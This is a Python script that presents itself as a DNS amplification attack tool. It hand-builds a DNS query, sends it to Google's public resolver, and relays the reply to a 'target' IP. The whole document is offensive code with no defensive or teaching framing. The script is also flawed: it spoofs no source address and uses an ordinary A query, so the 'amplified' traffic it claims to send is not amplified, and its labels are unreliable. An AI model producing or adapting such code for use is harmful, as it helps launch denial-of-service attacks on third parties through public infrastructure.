import socket

def create_dns_query(domain):
    # DNS header fields
    transaction_id = b'\xaa\xaa'  # Random transaction ID
    flags = b'\x01\x00'  # Standard query
    questions = b'\x00\x01'  # One question
    answer_rrs = b'\x00\x00'  # No answers
    authority_rrs = b'\x00\x00'  # No authority records
    additional_rrs = b'\x00\x00'  # No additional records

    # DNS question fields
    query_name = b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'
    query_type = b'\x00\x01'  # Type A
    query_class = b'\x00\x01'  # Class IN

    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query_name + query_type + query_class

def send_amplified_request(target_ip, dns_server, domain):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    query = create_dns_query(domain)
    sock.sendto(query, (dns_server, 53))

    try:
        response, _ = sock.recvfrom(4096)
        print(f"Received response from DNS server: {len(response)} bytes")
        sock.sendto(response, (target_ip, 53))
        print(f"Sent amplified response to target: {target_ip}")
    except socket.timeout:
        print("No response from DNS server")

if __name__ == "__main__":
    target_ip = "192.0.2.1"  # IP address of the target
    dns_server = "8.8.8.8"  # Public DNS server (Google DNS)
    domain = "example.com"  # Domain to query

    send_amplified_request(target_ip, dns_server, domain)